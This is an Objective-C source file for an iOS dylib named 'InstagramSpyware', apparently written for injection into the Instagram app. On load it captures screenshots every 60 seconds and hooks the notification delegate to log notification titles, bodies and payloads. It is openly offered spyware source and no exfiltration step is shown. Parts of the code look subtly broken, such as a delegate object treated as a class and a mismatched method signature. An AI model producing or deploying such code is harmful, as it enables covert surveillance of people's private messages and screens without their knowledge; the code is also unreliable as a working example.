#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// =============================================================================
// MARK: - Instagram Spyware Interface
// =============================================================================
@interface InstagramSpyware : NSObject
+ (instancetype)sharedInstance;
- (void)startAll;
- (void)takeScreenshot;
@end

// =============================================================================
// MARK: - Instagram Spyware Implementation
// =============================================================================
@implementation InstagramSpyware

+ (instancetype)sharedInstance {
    static InstagramSpyware *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[InstagramSpyware alloc] init];
    });
    return instance;
}

#pragma mark - Screenshot Taker

- (void)takeScreenshot {
    NSLog(@"[InstagramSpyware] Capturing screenshot...");
    
    // Find the key window. Instagram may have multiple, so we look for the main one.
    UIWindow *keyWindow = nil;
    NSArray *windows = [[UIApplication sharedApplication] windows];
    for (UIWindow *window in windows) {
        if (window.isKeyWindow) {
            keyWindow = window;
            break;
        }
    }
    if (!keyWindow) {
        keyWindow = windows.firstObject; // Fallback
    }

    if (!keyWindow) {
        NSLog(@"[InstagramSpyware] Could not find a key window to screenshot.");
        return;
    }

    // Use UIGraphicsImageRenderer for modern, high-quality screenshots
    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, [UIScreen mainScreen].scale);
    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    if (image) {
        NSData *imageData = UIImagePNGRepresentation(image);
        NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        
        // Create a unique filename with timestamp
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        [formatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss"];
        NSString *timestamp = [formatter stringFromDate:[NSDate date]];
        NSString *fileName = [NSString stringWithFormat:@"ig_screenshot_%@.png", timestamp];
        NSString *filePath = [documentsPath stringByAppendingPathComponent:fileName];

        NSError *error;
        BOOL success = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&error];
        
        if (success) {
            NSLog(@"[InstagramSpyware] Screenshot saved successfully to: %@", filePath);
        } else {
            NSLog(@"[InstagramSpyware] Failed to save screenshot: %@", error.localizedDescription);
        }
    } else {
        NSLog(@"[InstagramSpyware] Failed to capture screenshot.");
    }
}

#pragma mark - Notification Viewer

// This is a C function that will replace the original UNUserNotificationCenter delegate method.
// This is the modern way iOS delivers notifications to an app.
void swizzled_userNotificationCenter_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter *center, UNNotification *notification, __unused id completionHandler) {
    NSLog(@"[InstagramSpyware] Intercepted UNNotification!");
    
    // Extract the notification content
    UNNotificationContent *content = notification.request.content;
    NSString *title = content.title;
    NSString *body = content.body;
    NSString *userInfoString = [NSString stringWithFormat:@"%@", content.userInfo];
    
    NSLog(@"[InstagramSpyware] Title: %@", title);
    NSLog(@"[InstagramSpyware] Body: %@", body);
    NSLog(@"[InstagramSpyware] UserInfo: %@", userInfoString);

    // --- IMPORTANT ---
    // To get the original method implementation, we need to find the class that implements it.
    // This is usually the app delegate or a dedicated notification handler class.
    // We will search for it in the class list.
    Class originalClass = nil;
    int numClasses = objc_getClassList(NULL, 0);
    Class *classes = (Class *)malloc(sizeof(Class) * numClasses);
    objc_getClassList(classes, numClasses);
    for (int i = 0; i < numClasses; i++) {
        Class c = classes[i];
        // Check if this class conforms to the delegate protocol and implements the method
        if (class_conformsToProtocol(c, @protocol(UNUserNotificationCenterDelegate))) {
            Method m = class_getInstanceMethod(c, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
            if (m) {
                originalClass = c;
                break;
            }
        }
    }
    free(classes);

    // Now, call the original implementation if we found it.
    if (originalClass) {
        NSLog(@"[InstagramSpyware] Found original delegate class: %s", class_getName(originalClass));
        // Get the original implementation. It's now stored under our swizzled function's selector.
        Method originalMethod = class_getInstanceMethod(originalClass, @selector(swizzled_userNotificationCenter_didReceiveNotification:));
        if (originalMethod) {
            // The original method signature is (id, SEL, UNUserNotificationCenter *, UNNotification *, void(^)(void))
            void (*originalImp)(id, SEL, UNUserNotificationCenter *, UNNotification *, id) = (void (*)(id, SEL, UNUserNotificationCenter *, UNNotification *, id))method_getImplementation(originalMethod);
            originalImp(self, _cmd, center, notification, completionHandler);
        }
    } else {
        NSLog(@"[InstagramSpyware] Could not find original notification delegate class. Notification may not be processed by the app.");
    }
}

// This function hooks the notification delegate as soon as the dylib is loaded.
- (void)hookNotifications {
    NSLog(@"[InstagramSpyware] Attempting to hook UNUserNotificationCenter delegate...");
    
    // Find the class that acts as the UNUserNotificationCenter delegate
    Class delegateClass = [[UNUserNotificationCenter currentNotificationCenter] delegate];
    if (!delegateClass) {
        NSLog(@"[InstagramSpyware] UNUserNotificationCenter delegate is not set yet. Will retry later.");
        // If it's not set, we can try again after a delay or rely on the app to set it later.
        // For now, we'll use a runtime approach to find it when the method is called.
        return;
    }
    
    // Swizzle the specific method
    Method originalMethod = class_getInstanceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
    if (originalMethod) {
        // We replace the implementation with our C function.
        // The type signature "v24@0:8@16@24" represents the method's arguments.
        class_replaceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:), (IMP)swizzled_userNotificationCenter_didReceiveNotification, "v24@0:8@16@24");
        NSLog(@"[InstagramSpyware] Successfully swizzled notification delegate method on class %s", class_getName(delegateClass));
    } else {
        NSLog(@"[InstagramSpyware] Failed to find userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler: on delegate class.");
    }
}

#pragma mark - Main Start Function

- (void)startAll {
    NSLog(@"[InstagramSpyware] Starting all modules...");
    
    // 1. Start the screenshot timer
    [NSTimer scheduledTimerWithTimeInterval:60.0
                                     target:self
                                   selector:@selector(takeScreenshot)
                                   userInfo:nil
                                    repeats:YES];
    NSLog(@"[InstagramSpyware] Screenshot timer started (60s interval).");

    // 2. Hook notifications
    // We dispatch this to give the app time to set its delegate.
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self hookNotifications];
    });
}

@end

// =============================================================================
// MARK: - Constructor
// =============================================================================
__attribute__((constructor))
void initInstagramSpyware() {
    NSLog(@"[InstagramSpyware] Dylib loaded. Waiting for app to become active.");
    // Wait for the app to be fully active before starting our hooks.
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
                                                      object:nil
                                                       queue:[NSOperationQueue mainQueue]
                                                  usingBlock:^(NSNotification * _Nonnull note) {
        NSLog(@"[InstagramSpyware] App is active. Initializing spyware.");
        [[InstagramSpyware sharedInstance] startAll];
    }];
}
